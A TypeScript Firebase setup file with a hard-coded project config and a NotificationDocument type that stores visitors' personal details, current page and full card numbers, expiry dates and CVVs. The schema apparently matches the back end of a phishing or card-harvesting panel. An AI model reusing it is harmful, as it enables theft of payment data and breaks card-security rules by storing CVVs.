import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: 'AIzaSyAdE8-9VwRjiqbKSImyUPu3hugol5jEMWA',
  authDomain: 'ssdd-21562.firebaseapp.com',
  projectId: 'ssdd-21562',
  storageBucket: 'ssdd-21562.firebasestorage.app',
  messagingSenderId: '884523274527',
  appId: '1:884523274527:web:96d8f5c87cc5bfbe3a602a',
  measurementId: 'G-0DPHLEMEBZ',
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
